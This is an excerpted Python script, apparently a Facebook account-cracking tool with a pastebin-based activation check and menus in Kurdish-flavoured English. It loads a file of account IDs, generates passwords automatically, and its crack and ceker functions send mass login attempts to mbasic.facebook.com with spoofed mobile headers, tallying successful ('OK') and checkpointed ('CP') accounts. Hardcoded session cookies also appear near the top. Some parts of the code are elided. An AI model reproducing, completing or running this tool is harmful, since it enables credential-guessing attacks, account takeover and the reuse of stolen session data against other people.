def sasuke():
    ...
    try:
        url = requests.get("https://pastebin.com/raw/jShw7mUg").text
    except requests.exceptions.ConnectionError:
        print('No Internet Connection')
    if id in url:
        print("\033[92m  YOUR ID IS ACTIVE.........\033[97m")
    elif id not in url:
        print('\033[0;91mYour Id Not Activate Send Chat To @TFPDark bnusa')
        exit()
...
import requests
cookies = {
    'datr': 'l84AZfHDAuhnBOumI9FIgWHn',
    'sb': 'l84AZQoSQHhMPRD6aGsfCmbn',
    'vpd': 'v1%3B720x393x2.75',
    'locale': 'cb_IQ',
    'wl_cbv': 'v2%3Bclient_version%3A2324%3Btimestamp%3A1694768214',
    'm_pixel_ratio': '2.75',
    'wd': '393x851',
    'fr': '0fddU8dSyqQQ7sTgb.AWV7ihVFKoAXx-7CUqkexiTp4OE.BlAM6X.pv.AAA.0.0.BlBWoY.AWV8rK6KyqE',
}
headers = {
   'authority': 'mbasic.facebook.com',
    ...
    'dpr': '2.75',
    'referer': 'https://mbasic.facebook.com/login/device-based/edit-user/?uid=100045319041297&src=0&wtsid=rdr_0SSobTQgiCuxCGxVR&refsrc=deprecated&_rdr',
...
response = requests.get(
    'https://mbasic.facebook.com/login/?wtsid=rdr_0GHyGezrSTYNfAimV&refsrc=deprecated&_rdr',
    cookies=cookies,
    headers=headers,
    data=data,
)
...
for xd in range(10000):
	...
	h=random.randrange(90,100)
	i='0'
	j=random.randrange(5000,6000)
...
def uaku():
	try:
		...
		a=requests.get("https://pastebin.com/raw/jShw7mUg").text
		ua=open('.bbnew.txt','w')
...
def menu():
	...
	_IPYTHONI_(f'\x1b[1;98m1- CRACK FILE ')
	_____IPYTHONI_____ = input('\033[1;96mSELECT [1] :\x1b[1;97m ')
	if _____IPYTHONI_____ in ['1']:
		...
		back()
def error():
	print(f' \033[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91mBgarewa Bo Menu')
	time.sleep(2)
	back()
#INPUT-FILE	
def F():
...
class D:
	...
	def plerr(self):
		...
		try:
			...
			fileX = input ('\033[1;93mNAWE FILE : ')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\x1b[1;91mHAMW ID : \x1b[1;97m'+str(len(id)))
			Settings()
		except IOError:
...
def Settings():
	...
	print(f'\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m1\033[1;91m]\x1b[1;97mMOBILE\x1b[1;95m [BESTED]')
	hc = input('\x1b[1;96mSELECT :\x1b[1;97m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input('\x1b[1;91m\x1b[1;96m\x1b[1;97m[ A ] AUTO PASSWORD\x1b[1;92m [EASY]\n\x1b[1;96mSELECT [A] : \x1b[1;97m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def passwrd():
	...
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m CRACK TAWAW ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r (Dark) {P}{b}{loop}{P}•{b}{len(id)}{P}  ↪ OK:{P}{H}{ok}{P} ↪  CP:{P}{M}{cp}{P} ↪ ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
...
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 13; SM-A326U) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/4.0.2 Chrome/101.0.4951.41 Mobile Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;en-US,en;q=0.9"}
	ses = requests.Session()
	try:
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			ua = 'Mozilla/5.0 (Linux; Android 13; SM-A326U) AppleWebKit/537.36 (KHTML, like Gecko) JioPages/4.0.2 Chrome/101.0.4951.41 Mobile Safari/537.36'
			ses = requests.Session()
